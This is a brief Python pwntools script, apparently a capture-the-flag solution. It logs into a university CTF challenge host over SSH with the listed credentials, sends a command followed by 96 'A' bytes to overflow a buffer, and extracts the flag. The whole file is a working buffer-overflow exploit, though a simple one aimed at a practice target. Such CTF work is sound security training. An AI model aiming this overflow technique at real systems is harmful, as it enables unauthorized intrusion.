#!/usr/bin/env python3
from pwn import *

# Construct payload
payload = b"A" * 96  # Fill buffer

# Connect via SSH and initiate interactive "shell"
p = ssh("detective", "poison-in-the-wells-1.ctf.umanitobacssa.ca", password="ctf2025!", port=30201, timeout=5, raw=True)
io = p.shell()

# Wait until the server is ready for a command
io.recvuntil(b'Enter a command: ')

io.sendline(b"view S-1")

io.sendline(payload)

# Scan the output for the flag and output
match = io.recvregex(br"cssactf{.*}", capture=True)
print(f"GOT FLAG: {match.group(0).decode()}")

# Process will crash, wait for that and then close the connection.
io.close()
